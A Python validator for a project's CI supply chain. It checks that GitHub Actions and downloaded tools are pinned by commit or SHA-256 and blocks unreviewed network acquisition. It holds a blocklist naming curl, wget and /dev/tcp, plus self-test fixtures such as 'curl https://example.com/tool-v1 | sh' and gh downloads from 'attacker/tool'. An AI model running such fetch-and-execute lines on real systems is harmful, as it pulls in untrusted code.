#!/usr/bin/env python3
"""Validate RFC 104 immutable CI action and downloaded-tool identities."""

from __future__ import annotations

import copy
import hashlib
import json
import re
import sys
import tempfile
import os
import urllib.request
from pathlib import Path, PurePosixPath

from install_ci_tool import verify_digest

ROOT = Path(__file__).resolve().parent.parent
POLICY_PATH = ROOT / "ci" / "supply-chain.json"
WORKFLOWS = ROOT / ".github" / "workflows"
FULL_SHA_RE = re.compile(r"[0-9a-f]{40}\Z")
FULL_SHA256_RE = re.compile(r"[0-9a-f]{64}\Z")
USE_RE = re.compile(
    r'''^\s*(?:-\s*)?(?:"uses"|'uses'|uses)\s*:\s*(?:"([^"]+)"|'([^']+)'|([^\s#]+))''',
    re.MULTILINE)
USES_KEY_RE = re.compile(r'''(?<![A-Za-z0-9_])(?:"uses"|'uses'|uses)\s*:''')
YAML_KEY_ESCAPE_RE = re.compile(r"\\(?:u[0-9a-fA-F]{4}|x[0-9a-fA-F]{2})")
INSTALL_RE = re.compile(
    r"^\s*python3\s+scripts/install_ci_tool\.py\s+([a-z0-9_-]+)\s+--destination\b",
    re.MULTILINE)
FORBIDDEN_ACQUISITION_RE = re.compile(
    r"\b(?:curl|wget|aria2c|Invoke-WebRequest)\b|urllib\.request|urlopen\s*\("
    r"|requests\.(?:get|request)\s*\(|http\.client|aiohttp|httpx|/dev/tcp/",
    re.IGNORECASE)
PYTHON_RE = re.compile(r"\bpython(?:3(?:\.\d+)?)?\s+([^\s\\]+)")
GH_RE = re.compile(r"(?:^\s*|\brun:\s*)gh\s+([^\n]+)", re.MULTILINE)
GH_TOKEN_RE = re.compile(r"(?<![A-Za-z0-9_])(?:/[^\s]*/)?gh\s+")
GH_OVERRIDE_RE = re.compile(
    r"\b(?:GH_REPO|GH_HOST)\b|(?:^|\s)GITHUB_REPOSITORY\s*(?:=|:)"
    r"|(?:^|\s)(?:--hostname|-R)(?:\s|=)", re.MULTILINE)
ALLOWED_GH_RE = re.compile(
    r'^release\s+(?:create|upload|download)\s+"\$\{GITHUB_REF_NAME\}"\s+'
    r'--repo\s+"nabbisen/henret"(?:\s|$)')
ALLOWED_PYTHON = {
    "ci.yml": {"scripts/install_ci_tool.py", "scripts/release_publish_preflight.py",
               "scripts/verify_release_manifest.py"},
    "docs.yml": {"scripts/install_ci_tool.py"},
    "release-validation.yml": {"scripts/install_ci_tool.py"},
    "supply-chain-refresh.yml": {"scripts/ci_supply_chain.py"},
}


def validate_policy_shape(policy: object) -> list[str]:
    errors: list[str] = []
    if type(policy) is not dict or type(policy.get("schema")) is not int or \
            policy.get("schema") != 1:
        return ["policy root/schema must be object/schema 1"]
    if set(policy) != {"schema", "actions", "tools", "workflow_tools",
                       "workflow_sha256"}:
        errors.append("policy keys must be exactly schema/actions/tools/"
                      "workflow_tools/workflow_sha256")
    actions = policy.get("actions")
    tools = policy.get("tools")
    workflow_tools = policy.get("workflow_tools")
    workflow_sha256 = policy.get("workflow_sha256")
    if type(actions) is not dict or type(tools) is not dict or \
            type(workflow_tools) is not dict or type(workflow_sha256) is not dict:
        return errors + ["policy actions, tools, workflow_tools, and workflow_sha256 "
                         "must be objects"]
    for name, pin in actions.items():
        if not isinstance(name, str) or not name:
            errors.append("action names must be non-empty strings")
        if type(pin) is not dict or set(pin) != {"version", "commit"}:
            errors.append(f"action {name} pin must contain exactly version/commit")
            continue
        if not isinstance(pin.get("commit"), str) or \
                FULL_SHA_RE.fullmatch(pin["commit"]) is None:
            errors.append(f"action {name} lacks a full lowercase commit SHA")
        if not isinstance(pin.get("version"), str) or not pin["version"].startswith("v"):
            errors.append(f"action {name} lacks a human-readable version")
    for name, pin in tools.items():
        if not isinstance(name, str) or not name:
            errors.append("tool names must be non-empty strings")
        if type(pin) is not dict:
            errors.append(f"tool {name} policy must be an object")
            continue
        version, url = pin.get("version"), pin.get("url")
        if not isinstance(version, str) or not isinstance(url, str) or version not in url:
            errors.append(f"tool {name} URL is not bound to its exact version")
        if "latest" in str(url).lower():
            errors.append(f"tool {name} URL uses latest")
        if not isinstance(pin.get("sha256"), str) or \
                FULL_SHA256_RE.fullmatch(pin["sha256"]) is None:
            errors.append(f"tool {name} lacks a full lowercase SHA-256")
        if pin.get("archive") not in ("tar.gz", "zip"):
            errors.append(f"tool {name} archive must be tar.gz or zip")
        binary = pin.get("binary")
        if not isinstance(binary, str) or not binary or PurePosixPath(binary).is_absolute() \
                or ".." in PurePosixPath(binary).parts:
            errors.append(f"tool {name} binary must be a safe relative path")
        allowed = {"version", "url", "sha256", "archive", "binary", "platform"}
        if not set(pin) <= allowed or "platform" in pin and \
                (not isinstance(pin["platform"], str) or not pin["platform"]):
            errors.append(f"tool {name} contains invalid policy fields")
    for filename, required in workflow_tools.items():
        if not isinstance(filename, str) or Path(filename).name != filename or \
                not filename.endswith((".yml", ".yaml")) or type(required) is not list or \
                any(type(tool) is not str for tool in required) or len(required) != len(set(required)):
            errors.append(f"workflow_tools entry {filename!r} must be a unique string list")
        elif not set(required) <= set(tools):
            errors.append(f"workflow_tools entry {filename!r} names an unknown tool")
    if set(workflow_sha256) != set(workflow_tools):
        errors.append("workflow_sha256 and workflow_tools file sets disagree")
    for filename, digest in workflow_sha256.items():
        if not isinstance(filename, str) or not isinstance(digest, str) or \
                FULL_SHA256_RE.fullmatch(digest) is None:
            errors.append(f"workflow_sha256 entry {filename!r} is invalid")
    return errors


def workflow_hash(source: str | bytes) -> str:
    raw = source if isinstance(source, bytes) else source.encode()
    return hashlib.sha256(raw).hexdigest()


def workflow_text(source: str | bytes) -> str:
    return source.decode("utf-8") if isinstance(source, bytes) else source


def action_uses(text: str) -> list[tuple[str, str]]:
    observed: list[tuple[str, str]] = []
    for groups in USE_RE.findall(text):
        value = next(group for group in groups if group)
        if "@" not in value:
            observed.append((value, ""))
        else:
            observed.append(tuple(value.rsplit("@", 1)))
    return observed


def acquisition_route_errors(filename: str, text: str) -> list[str]:
    """Allow only reviewed workflow acquisition entrypoints.

    The whole-file digest is the primary byte allowlist. These structural
    checks keep a deliberate digest update from approving interpreter/client
    bypasses without an accompanying policy-contract change.
    """
    errors: list[str] = []
    active = "\n".join(line for line in text.splitlines()
                       if not line.lstrip().startswith("#"))
    logical = re.sub(r"\\\s*\n\s*", " ", active)
    if FORBIDDEN_ACQUISITION_RE.search(logical):
        errors.append(f"{filename} contains a forbidden acquisition mechanism")
    allowed_python = ALLOWED_PYTHON.get(filename, set())
    for target in PYTHON_RE.findall(logical):
        if target not in allowed_python:
            errors.append(f"{filename} invokes unapproved Python entrypoint {target}")
    for command in GH_RE.findall(logical):
        if filename != "ci.yml" or ALLOWED_GH_RE.match(command) is None or \
                command.count("--repo") != 1 or GH_OVERRIDE_RE.search(command):
            errors.append(f"{filename} invokes unapproved gh route: {command.strip()}")
    if GH_OVERRIDE_RE.search(logical):
        errors.append(f"{filename} contains a gh repository/host override")
    if len(GH_TOKEN_RE.findall(logical)) != len(GH_RE.findall(logical)):
        errors.append(f"{filename} contains an unparsed or prefixed gh command")
    return errors


def validate(policy: object, workflow_texts: dict[str, str | bytes], metadata_text: str,
             toolchain_text: str) -> list[str]:
    errors = validate_policy_shape(policy)
    if errors:
        return errors
    actions = policy["actions"]
    tools = policy["tools"]
    workflow_tools = policy["workflow_tools"]
    workflow_sha256 = policy["workflow_sha256"]

    observed_actions: set[str] = set()
    for filename, source in workflow_texts.items():
        try:
            text = workflow_text(source)
        except UnicodeDecodeError as exc:
            errors.append(f"{filename} is not UTF-8: {exc}")
            continue
        if re.search(r"releases/latest|/latest/|releases/download/\$", text, re.I):
            errors.append(f"{filename} contains a movable latest/download reference")
        if workflow_hash(source) != workflow_sha256.get(filename):
            errors.append(f"{filename} bytes disagree with workflow_sha256 policy")
        errors.extend(acquisition_route_errors(filename, text))
        uses = action_uses(text)
        if len(uses) != len(USES_KEY_RE.findall(text)) or YAML_KEY_ESCAPE_RE.search(text):
            errors.append(f"{filename} contains unsupported or escaped YAML key syntax")
        for action, ref in uses:
            observed_actions.add(action)
            expected = actions.get(action)
            if expected is None:
                errors.append(f"{filename} uses unregistered action {action}")
            elif ref != expected.get("commit"):
                errors.append(f"{filename} action {action} is not pinned to policy commit")
        installed = INSTALL_RE.findall(text)
        required = workflow_tools.get(filename)
        if required is None:
            errors.append(f"{filename} is absent from workflow_tools policy")
        elif sorted(installed) != sorted(required) or len(installed) != len(required):
            errors.append(f"{filename} installer calls {installed} do not exactly match "
                          f"required tools {required}")
    if observed_actions != set(actions):
        errors.append("policy/workflow action set mismatch: "
                      f"policy={sorted(actions)}, observed={sorted(observed_actions)}")
    if set(workflow_texts) != set(workflow_tools):
        errors.append("policy/workflow file set mismatch: "
                      f"policy={sorted(workflow_tools)}, observed={sorted(workflow_texts)}")
    if "https://github.com/nabbisen/henret" not in metadata_text or \
            re.search(r"placeholder|example\.com", metadata_text, re.I):
        errors.append("lakefile repository metadata is missing or placeholder")
    lean_version = tools.get("lean", {}).get("version")
    if toolchain_text.strip() != f"leanprover/lean4:{lean_version}":
        errors.append("lean-toolchain selector disagrees with pinned Lean archive")
    return errors


def load_workflows() -> dict[str, bytes]:
    paths = sorted({*WORKFLOWS.glob("*.yml"), *WORKFLOWS.glob("*.yaml")})
    return {path.name: path.read_bytes() for path in paths}


def update_audit(policy: dict) -> int:
    """Report upstream movement without changing source or release state."""
    headers = {"Accept": "application/vnd.github+json",
               "User-Agent": "henret-rfc104-refresh/1"}
    token = os.environ.get("GITHUB_TOKEN")
    if token:
        headers["Authorization"] = f"Bearer {token}"

    def github_json(url: str) -> dict:
        request = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(request, timeout=30) as response:
            return json.load(response)

    updates = 0
    for action, pin in sorted(policy["actions"].items()):
        ref = github_json(f"https://api.github.com/repos/{action}/git/ref/tags/"
                          f"{pin['version']}")
        observed = ref["object"]["sha"]
        state = "current" if observed == pin["commit"] else "UPDATE"
        updates += observed != pin["commit"]
        print(f"{state}: {action} {pin['version']} {pin['commit']} -> {observed}")
    # Lean is the repository language/toolchain contract, so an upstream newer
    # compiler is not an automatic supply-chain update. Confirm the exact locked
    # release still exists; compiler upgrades remain separately reviewed work.
    lean_version = policy["tools"]["lean"]["version"]
    lean_release = github_json(
        f"https://api.github.com/repos/leanprover/lean4/releases/tags/{lean_version}")
    observed_lean = lean_release["tag_name"]
    lean_current = observed_lean == lean_version
    updates += not lean_current
    print(f"{'current' if lean_current else 'UPDATE'}: lean locked release "
          f"{lean_version} -> {observed_lean}")

    latest_mdbook = github_json(
        "https://api.github.com/repos/rust-lang/mdBook/releases/latest")["tag_name"]
    pinned_mdbook = policy["tools"]["mdbook"]["version"]
    mdbook_current = latest_mdbook == pinned_mdbook
    updates += not mdbook_current
    print(f"{'current' if mdbook_current else 'UPDATE'}: mdbook "
          f"{pinned_mdbook} -> {latest_mdbook}")
    if updates:
        print(f"ci-supply-chain-refresh: {updates} reviewed source update(s) required")
        return 1
    print("ci-supply-chain-refresh: all pins current")
    return 0


def self_test() -> int:
    policy = json.loads(POLICY_PATH.read_text())
    workflows = load_workflows()
    metadata = (ROOT / "lakefile.lean").read_text()
    toolchain = (ROOT / "lean-toolchain").read_text()
    failures = int(bool(validate(policy, workflows, metadata, toolchain)))
    cases: list[tuple[object, dict[str, str | bytes], str, str]] = []

    def workflow_case(filename: str, suffix: str) -> tuple[
            dict, dict[str, str | bytes], str, str]:
        changed_policy = copy.deepcopy(policy)
        changed_workflows = dict(workflows)
        source = changed_workflows[filename]
        changed_workflows[filename] = source + (suffix.encode() if isinstance(source, bytes)
                                                 else suffix)
        # Model an intentional workflow-digest update so each fixture exercises
        # the structural route/action contract rather than only the byte lock.
        changed_policy["workflow_sha256"][filename] = workflow_hash(
            changed_workflows[filename])
        return changed_policy, changed_workflows, metadata, toolchain

    boolean_schema = copy.deepcopy(policy)
    boolean_schema["schema"] = True
    cases.append((boolean_schema, workflows, metadata, toolchain))
    bad_action = copy.deepcopy(policy)
    bad_action["actions"]["actions/checkout"]["commit"] = "v6"
    cases.append((bad_action, workflows, metadata, toolchain))
    bad_tool_hash = copy.deepcopy(policy)
    bad_tool_hash["tools"]["lean"]["sha256"] = "0" * 63
    cases.append((bad_tool_hash, workflows, metadata, toolchain))
    latest_tool = copy.deepcopy(policy)
    mdbook_version = latest_tool["tools"]["mdbook"]["version"]
    latest_tool["tools"]["mdbook"]["url"] = latest_tool["tools"]["mdbook"]["url"].replace(
        mdbook_version, "latest", 1)
    cases.append((latest_tool, workflows, metadata, toolchain))
    movable_workflow = dict(workflows)
    first = next(iter(movable_workflow))
    source = movable_workflow[first]
    movable_workflow[first] = movable_workflow[first].replace(
        policy["actions"]["actions/checkout"]["commit"].encode(), b"v6") \
        if isinstance(source, bytes) else source.replace(
            policy["actions"]["actions/checkout"]["commit"], "v6")
    movable_policy = copy.deepcopy(policy)
    movable_policy["workflow_sha256"][first] = workflow_hash(movable_workflow[first])
    cases.append((movable_policy, movable_workflow, metadata, toolchain))
    yaml_bypass = dict(workflows)
    yaml_bypass["bypass.yaml"] = b"steps:\n  - uses: actions/checkout@v6\n"
    cases.append((policy, yaml_bypass, metadata, toolchain))
    byte_drift = dict(workflows)
    byte_drift["docs.yml"] += b"\n# unreviewed workflow byte drift\n"
    cases.append((policy, byte_drift, metadata, toolchain))
    crlf_drift = dict(workflows)
    crlf_drift["docs.yml"] = crlf_drift["docs.yml"].replace(b"\n", b"\r\n")
    cases.append((policy, crlf_drift, metadata, toolchain))
    cases.append(workflow_case(
        "docs.yml", "\n      - run: curl https://example.com/tool-v1 | sh\n"))
    cases.append(workflow_case(
        "docs.yml", '\n      - "uses": attacker/tool@main\n'))
    cases.append(workflow_case(
        "docs.yml", "\n      - uses : attacker/tool@main\n"))
    cases.append(workflow_case(
        "docs.yml", '\n      - run: python3 -c "import http.client as h; '
        'h.HTTPSConnection(\'example.com\')"\n'))
    cases.append(workflow_case(
        "docs.yml", "\n      - run: gh release download v1 --repo attacker/tool\n"))
    cases.append(workflow_case(
        "ci.yml", '\n      - run: |\n          gh release download "${GITHUB_REF_NAME}" \\\n'
        '            --repo attacker/tool\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - name: external via GH_REPO\n        env:\n'
        '          GH_REPO: attacker/tool\n        run: gh release download '
        '"${GITHUB_REF_NAME}" --repo "nabbisen/henret"\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - run: GH_REPO=attacker/tool gh release download '
        '"${GITHUB_REF_NAME}" --repo "nabbisen/henret"\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - name: external host\n        env:\n          GH_HOST: example.com\n'
        '        run: gh release download "${GITHUB_REF_NAME}" '
        '--repo "nabbisen/henret"\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - run: env gh release download "${GITHUB_REF_NAME}" '
        '--repo attacker/tool\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - run: /usr/bin/gh release download "${GITHUB_REF_NAME}" '
        '--repo attacker/tool\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - run: |\n          export GITHUB_REPOSITORY=attacker/tool\n'
        '          gh release download "${GITHUB_REF_NAME}" --repo "nabbisen/henret"\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - run: |\n          GITHUB_REPOSITORY=attacker/tool\n'
        '          gh release download "${GITHUB_REF_NAME}" --repo "nabbisen/henret"\n'))
    cases.append(workflow_case(
        "ci.yml", '\n      - env:\n          GITHUB_REPOSITORY: attacker/tool\n'
        '        run: gh release download "${GITHUB_REF_NAME}" '
        '--repo "nabbisen/henret"\n'))
    cases.append((policy, workflows, metadata.replace(
        "https://github.com/nabbisen/henret", "https://example.com/placeholder"),
                  toolchain))
    cases.append((policy, workflows, metadata, "leanprover/lean4:v0.0.0\n"))
    failures += sum(not validate(p, w, m, t) for p, w, m, t in cases)

    allowed_gh = """steps:
  - run: gh release create "${GITHUB_REF_NAME}" --repo "nabbisen/henret"
  - run: gh release upload "${GITHUB_REF_NAME}" --repo "nabbisen/henret" asset
  - run: gh release download "${GITHUB_REF_NAME}" --repo "nabbisen/henret"
"""
    failures += int(bool(acquisition_route_errors("ci.yml", allowed_gh)))

    with tempfile.TemporaryDirectory(prefix="henret-digest-selftest-") as td:
        fixture = Path(td) / "fixture"
        fixture.write_bytes(b"verified bytes\n")
        good = hashlib.sha256(fixture.read_bytes()).hexdigest()
        try:
            verify_digest(fixture, good)
        except ValueError:
            failures += 1
        try:
            verify_digest(fixture, "0" * 64)
            failures += 1
        except ValueError:
            pass

    print(f"ci-supply-chain-selftest: valid + 3 allowed Henret gh routes + "
          f"{len(cases)} invalid policy/workflow fixtures + checksum accept/reject; "
          f"{failures} error(s)")
    return 1 if failures else 0


def main() -> int:
    if "--self-test" in sys.argv:
        return self_test()
    policy = json.loads(POLICY_PATH.read_text())
    if "--check-updates" in sys.argv:
        return update_audit(policy)
    errors = validate(policy, load_workflows(), (ROOT / "lakefile.lean").read_text(),
                      (ROOT / "lean-toolchain").read_text())
    for error in errors:
        print(f"ci-supply-chain: FAIL — {error}")
    if errors:
        return 1
    print("ci-supply-chain: action commits and downloaded-tool pins match policy")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
